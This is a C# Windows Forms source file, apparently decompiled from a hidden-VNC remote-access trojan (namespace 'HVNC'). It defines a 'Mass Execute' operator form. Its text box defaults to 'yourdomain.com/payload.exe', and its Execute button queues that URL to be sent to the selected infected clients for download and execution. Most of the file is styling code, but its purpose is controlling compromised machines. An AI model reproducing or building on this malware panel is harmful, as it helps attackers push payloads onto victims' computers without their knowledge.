

using Siticone.Desktop.UI.WinForms;
using Siticone.Desktop.UI.WinForms.Interfaces;
using System;
using System.ComponentModel;
using System.Drawing;
using System.Windows.Forms;

namespace HVNC
{
  public class FrmMassUpdate : Form
  {
    public int count;
    private IContainer components;
    private SiticoneGradientPanel siticoneGradientPanel4;
    private SiticoneTextBox Urlbox;
    public SiticoneGradientButton StartHiddenURLbtn;
    private Panel panel1;
    private SiticoneControlBox siticoneControlBox1;
    private PictureBox pictureBox1;
    private Label label18;
    private SiticoneDragControl siticoneDragControl1;
    private SiticoneBorderlessForm siticoneBorderlessForm1;

    public FrmMassUpdate() => this.InitializeComponent();

    private void StartHiddenURLbtn_Click(object sender, EventArgs e)
    {
      try
      {
        if (string.IsNullOrWhiteSpace(this.Urlbox.Text))
        {
          int num1 = (int) MessageBox.Show("URL is not valid!");
        }
        else
        {
          FrmMain.MassURL = this.Urlbox.Text;
          FrmMain.ispressed = true;
          int num2 = (int) MessageBox.Show("Executed Successfully!", "HVNC", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
          this.Close();
        }
      }
      catch (Exception ex)
      {
        int num = (int) MessageBox.Show("An Error Has Occured When Trying To Update Selected Client(s)");
        this.Close();
      }
    }

    protected override void Dispose(bool disposing)
    {
      if (disposing && this.components != null)
        this.components.Dispose();
      base.Dispose(disposing);
    }

    private void InitializeComponent()
    {
      this.components = (IContainer) new System.ComponentModel.Container();
      ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof (FrmMassUpdate));
      this.panel1 = new Panel();
      this.siticoneControlBox1 = new SiticoneControlBox();
      this.pictureBox1 = new PictureBox();
      this.label18 = new Label();
      this.siticoneGradientPanel4 = new SiticoneGradientPanel();
      this.Urlbox = new SiticoneTextBox();
      this.StartHiddenURLbtn = new SiticoneGradientButton();
      this.siticoneDragControl1 = new SiticoneDragControl(this.components);
      this.siticoneBorderlessForm1 = new SiticoneBorderlessForm(this.components);
      this.panel1.SuspendLayout();
      ((ISupportInitialize) this.pictureBox1).BeginInit();
      this.SuspendLayout();
      this.panel1.BackColor = Color.FromArgb(27, 27, 27);
      this.panel1.Controls.Add((Control) this.siticoneControlBox1);
      this.panel1.Controls.Add((Control) this.pictureBox1);
      this.panel1.Controls.Add((Control) this.label18);
      this.panel1.Dock = DockStyle.Top;
      this.panel1.Location = new Point(0, 0);
      this.panel1.Name = "panel1";
      this.panel1.Size = new Size(549, 34);
      this.panel1.TabIndex = 164;
      this.siticoneControlBox1.Anchor = AnchorStyles.Top | AnchorStyles.Right;
      this.siticoneControlBox1.FillColor = Color.Transparent;
      this.siticoneControlBox1.HoverState.Parent = this.siticoneControlBox1;
      this.siticoneControlBox1.IconColor = Color.White;
      this.siticoneControlBox1.Location = new Point(522, 6);
      this.siticoneControlBox1.Name = "siticoneControlBox1";
      this.siticoneControlBox1.ShadowDecoration.Parent = (Control) this.siticoneControlBox1;
      this.siticoneControlBox1.Size = new Size(24, 22);
      this.siticoneControlBox1.TabIndex = 146;
      this.pictureBox1.ErrorImage = (Image) null;
      this.pictureBox1.Image = (Image) componentResourceManager.GetObject("pictureBox1.Image");
      this.pictureBox1.InitialImage = (Image) null;
      this.pictureBox1.Location = new Point(3, 4);
      this.pictureBox1.Name = "pictureBox1";
      this.pictureBox1.Size = new Size(24, 24);
      this.pictureBox1.SizeMode = PictureBoxSizeMode.StretchImage;
      this.pictureBox1.TabIndex = 7;
      this.pictureBox1.TabStop = false;
      this.label18.AutoSize = true;
      this.label18.Font = new Font("Microsoft Sans Serif", 12f, FontStyle.Regular, GraphicsUnit.Point, (byte) 0);
      this.label18.ForeColor = Color.Gainsboro;
      this.label18.Location = new Point(34, 8);
      this.label18.Name = "label18";
      this.label18.Size = new Size(109, 20);
      this.label18.TabIndex = 2;
      this.label18.Text = "Mass Execute";
      this.siticoneGradientPanel4.BackColor = Color.FromArgb(27, 27, 27);
      this.siticoneGradientPanel4.Dock = DockStyle.Top;
      this.siticoneGradientPanel4.FillColor = Color.FromArgb(92 ,36 , 28);
      this.siticoneGradientPanel4.FillColor2 = Color.FromArgb(27, 27, 27);
      this.siticoneGradientPanel4.Location = new Point(0, 34);
      this.siticoneGradientPanel4.Name = "siticoneGradientPanel4";
      this.siticoneGradientPanel4.ShadowDecoration.Parent = (Control) this.siticoneGradientPanel4;
      this.siticoneGradientPanel4.Size = new Size(549, 31);
      this.siticoneGradientPanel4.TabIndex = 167;
      this.Urlbox.Animated = true;
      this.Urlbox.BorderColor = Color.FromArgb(92 ,36 , 28);
      this.Urlbox.Cursor = Cursors.IBeam;
      this.Urlbox.DefaultText = "yourdomain.com/payload.exe";
      this.Urlbox.DisabledState.BorderColor = Color.FromArgb(208, 208, 208);
      this.Urlbox.DisabledState.FillColor = Color.FromArgb(226, 226, 226);
      this.Urlbox.DisabledState.ForeColor = Color.FromArgb(138, 138, 138);
      this.Urlbox.DisabledState.Parent = this.Urlbox;
      this.Urlbox.DisabledState.PlaceholderForeColor = Color.FromArgb(138, 138, 138);
      this.Urlbox.FillColor = Color.FromArgb(20, 20, 20);
      this.Urlbox.FocusedState.BorderColor = Color.FromArgb(92 ,36 , 28);
      this.Urlbox.FocusedState.Parent = this.Urlbox;
      this.Urlbox.Font = new Font("Segoe UI", 9f);
      this.Urlbox.ForeColor = Color.DarkGray;
      this.Urlbox.HoverState.BorderColor = Color.FromArgb(92 ,36 , 28);
      this.Urlbox.HoverState.Parent = this.Urlbox;
      this.Urlbox.Location = new Point(60, 136);
      this.Urlbox.Name = "Urlbox";
      this.Urlbox.PasswordChar = char.MinValue;
      this.Urlbox.PlaceholderForeColor = Color.DarkGray;
      this.Urlbox.PlaceholderText = "";
      this.Urlbox.SelectedText = "";
      this.Urlbox.SelectionStart = 26;
      this.Urlbox.ShadowDecoration.Parent = (Control) this.Urlbox;
      this.Urlbox.Size = new Size(273, 30);
      this.Urlbox.TabIndex = 166;
      this.Urlbox.TextAlign = HorizontalAlignment.Center;
      this.StartHiddenURLbtn.BackColor = Color.FromArgb(20, 20, 20);
      this.StartHiddenURLbtn.BorderColor = Color.FromArgb(92 ,36 , 28);
      this.StartHiddenURLbtn.BorderRadius = 1;
      this.StartHiddenURLbtn.BorderThickness = 1;
      this.StartHiddenURLbtn.CheckedState.Parent = (ICustomButtonControl) this.StartHiddenURLbtn;
      this.StartHiddenURLbtn.CustomImages.Parent = (ICustomButtonControl) this.StartHiddenURLbtn;
      this.StartHiddenURLbtn.DisabledState.BorderColor = Color.DarkGray;
      this.StartHiddenURLbtn.DisabledState.CustomBorderColor = Color.DarkGray;
      this.StartHiddenURLbtn.DisabledState.FillColor = Color.FromArgb(169, 169, 169);
      this.StartHiddenURLbtn.DisabledState.FillColor2 = Color.FromArgb(169, 169, 169);
      this.StartHiddenURLbtn.DisabledState.ForeColor = Color.FromArgb(141, 141, 141);
      this.StartHiddenURLbtn.DisabledState.Parent = (ICustomButtonControl) this.StartHiddenURLbtn;
      this.StartHiddenURLbtn.FillColor = Color.Transparent;
      this.StartHiddenURLbtn.FillColor2 = Color.Transparent;
      this.StartHiddenURLbtn.Font = new Font("Segoe UI", 9f);
      this.StartHiddenURLbtn.ForeColor = Color.Gainsboro;
      this.StartHiddenURLbtn.HoverState.Parent = (ICustomButtonControl) this.StartHiddenURLbtn;
      this.StartHiddenURLbtn.Location = new Point(366, 136);
      this.StartHiddenURLbtn.Name = "StartHiddenURLbtn";
      this.StartHiddenURLbtn.ShadowDecoration.Parent = (Control) this.StartHiddenURLbtn;
      this.StartHiddenURLbtn.Size = new Size(106, 30);
      this.StartHiddenURLbtn.TabIndex = 165;
      this.StartHiddenURLbtn.Text = "Execute";
      this.StartHiddenURLbtn.Click += new EventHandler(this.StartHiddenURLbtn_Click);
      this.siticoneDragControl1.TargetControl = (Control) this.panel1;
      this.siticoneBorderlessForm1.ContainerControl = (ContainerControl) this;
      this.siticoneBorderlessForm1.ShadowColor = Color.FromArgb(243, 30, 30);
      this.AutoScaleDimensions = new SizeF(6f, 13f);
      this.AutoScaleMode = AutoScaleMode.Font;
      this.BackColor = Color.FromArgb(27, 27, 27);
      this.ClientSize = new Size(549, 252);
      this.Controls.Add((Control) this.siticoneGradientPanel4);
      this.Controls.Add((Control) this.Urlbox);
      this.Controls.Add((Control) this.StartHiddenURLbtn);
      this.Controls.Add((Control) this.panel1);
      this.FormBorderStyle = FormBorderStyle.None;
      this.Icon = (Icon) componentResourceManager.GetObject("$this.Icon");
      this.MaximumSize = new Size(549, 252);
      this.MinimumSize = new Size(549, 252);
      this.Name = nameof (FrmMassUpdate);
      this.StartPosition = FormStartPosition.CenterScreen;
      this.Text = "FrmURL";
      this.panel1.ResumeLayout(false);
      this.panel1.PerformLayout();
      ((ISupportInitialize) this.pictureBox1).EndInit();
      this.ResumeLayout(false);
    }
  }
}
